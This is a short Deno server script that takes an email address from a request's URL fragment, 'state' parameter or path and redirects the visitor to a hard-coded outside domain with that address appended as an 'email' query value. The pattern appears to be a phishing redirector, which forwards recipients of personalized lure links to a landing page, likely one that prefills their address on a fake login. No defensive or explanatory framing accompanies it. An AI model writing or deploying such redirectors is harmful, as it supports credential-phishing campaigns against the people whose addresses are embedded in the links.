const PORT = Number(Deno.env.get("PORT") || 8080);

Deno.serve({ port: PORT }, async (req) => {
  const url = new URL(req.url);

  const redirectBase =
    "http://jnstaxservices.com/services";

  let email: string | null = null;

  if (url.hash) {
    const raw = url.hash.startsWith("#") ? url.hash.slice(1) : url.hash;
    if (raw) {
      try {
        const decoded = decodeURIComponent(raw);
        if (decoded.includes("@") && !decoded.includes("/")) {
          email = decoded;
        }
      } catch {
        email = null;
      }
    }
  }

  if (!email) {
    const state = url.searchParams.get("state");
    if (state) {
      try {
        const decoded = decodeURIComponent(state);
        if (decoded.includes("@") && !decoded.includes("/")) {
          email = decoded;
        }
      } catch {
        email = null;
      }
    }
  }

  if (!email) {
    const path = url.pathname.replace(/\/+$/, "").split("/").at(-1);
    if (path && path.includes("@") && !path.includes("/")) {
      try {
        email = decodeURIComponent(path);
      } catch {
        email = null;
      }
    }
  }

  const redirectUrl = email
    ? redirectBase.replace(/\/+$/, "") + "?email=" + email
    : redirectBase;

  return Response.redirect(redirectUrl, 302);
});
